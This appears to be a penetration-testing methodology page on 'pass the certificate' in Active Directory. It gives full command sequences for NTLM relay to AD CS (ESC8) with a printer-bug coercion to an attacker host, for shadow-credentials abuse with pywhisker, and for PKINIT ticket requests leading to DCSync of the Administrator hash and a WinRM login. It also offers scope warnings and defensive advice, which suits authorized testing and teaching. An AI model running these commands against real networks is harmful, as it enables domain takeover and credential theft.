---
layout: page
title: "Pass the Certificate"
subtitle: "Obtaining a TGT from an X.509 certificate through PKINIT, by relaying to AD CS or writing shadow credentials"
permalink: /methodology/lateral-movement/pass-the-certificate/
---

Pass the certificate uses an X.509 certificate, rather than a password or hash, to request a Kerberos TGT. The mechanism is PKINIT, an extension of Kerberos that allows public-key authentication. Two routes appear in the notes. The first relays an NTLM authentication to the AD CS web enrollment endpoint (ESC8) and receives a certificate for a machine account. The second writes a new key credential to a user through the `msDS-KeyCredentialLink` attribute, which is called shadow credentials. Both routes end with a TGT that can be imported as a ccache file.

> Both routes change directory state or obtain highly privileged material. Confirm the scope in writing, and record every certificate issued and every attribute written.
{: .warning }

## Route 1: NTLM relay to AD CS (ESC8)

### Step 1: Prepare the relay

AD CS supports several enrollment methods, including web enrollment, usually hosted at `CertSrv`. Enumerate the certificate template name first. The notes say the template name varies between environments and that a tool such as Certipy can list it.

```bash
impacket-ntlmrelayx -t http://CA_IP/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

### Step 2: Force the authentication

The relay waits for an inbound connection. The notes force one with the printer bug, which needs the Print Spooler service on the victim.

```bash
python3 printerbug.py DOMAIN/USERNAME:PASSWORD@DC_IP ATTACKER_IP
```

### Step 3: Collect the certificate

When the relay succeeds, it prints a certificate ID and writes a PKCS#12 file named after the victim machine account, for example `DC_HOST$.pfx`.

### Step 4: Request a TGT

```bash
python3 gettgtpkinit.py -cert-pfx 'DC_HOST$.pfx' -dc-ip DC_IP 'DOMAIN/DC_HOST$' CCACHE_FILE
```

### Step 5: Use the machine account

The domain controller's machine account can run a DCSync, which the notes use to retrieve the Administrator hash.

```bash
export KRB5CCNAME=CCACHE_FILE
impacket-secretsdump -k -no-pass -dc-ip DC_IP -just-dc-user Administrator 'DOMAIN/DC_HOST$'@DC_FQDN
```

The output contains live hashes. Record only that the retrieval succeeded.

## Route 2: Shadow credentials

### Step 1: Find the write right

In BloodHound, the `AddKeyCredentialLink` edge shows that one account can write `msDS-KeyCredentialLink` on another. That write lets the attacker take over the target.

### Step 2: Add a key credential

pywhisker generates a certificate, writes its public key to the target and exports a PFX file with a password.

```bash
pywhisker --dc-ip DC_IP -d DOMAIN -u USERNAME -p PASSWORD --target TARGET_USER --action add
```

### Step 3: Request a TGT for the target

```bash
python3 gettgtpkinit.py -cert-pfx PFX_FILE -pfx-pass PFX_PASSWORD -dc-ip DC_IP DOMAIN/TARGET_USER CCACHE_FILE
```

### Step 4: Use the ticket

```bash
export KRB5CCNAME=CCACHE_FILE
klist
evil-winrm -i DC_FQDN -r DOMAIN
```

The notes reached WinRM because the target was a member of Remote Management Users. Evil-WinRM needs the realm and `krb5.conf` set as described on the Linux ticket page.

## Pass the certificate without PKINIT

If PKINIT is unavailable, the notes state that a certificate can still authenticate to LDAPS and support further attacks. The notes give no commands for this case.

## What to look for

- Whether the Print Spooler service runs on the victim, which the printer-bug trigger requires.
- Whether AD CS web enrollment (`CertSrv`) is reachable and which templates it offers.
- Which accounts have write access to `msDS-KeyCredentialLink`, and whether the target is in Remote Management Users.
- The PFX password printed at creation. It is required for every later step and is itself a secret.

## Pitfalls

- The template name in the relay command may not match the environment. Confirm it before relaying.
- Kerberos tools need the FQDNs and a correct `krb5.conf` realm. Mismatched names fail with unclear errors.
- The notes do not describe removing the key credential that shadow credentials adds. Note it in the report, and remove it with the tool's removal option after confirming that option in the tool's help output.
- A relayed certificate is for a machine account, so the rights it grants are as broad as that account's.

## Defense

- Disable the Print Spooler on domain controllers and servers that do not need it, since the printer-bug trigger depends on it.
- Restrict or remove AD CS web enrollment (`CertSrv`) when it is not required, because the relay targets that HTTP endpoint.
- Limit who can write `msDS-KeyCredentialLink`. Review the ACLs that BloodHound reports as `AddKeyCredentialLink` edges.
- Monitor changes to `msDS-KeyCredentialLink` on privileged and sensitive accounts.
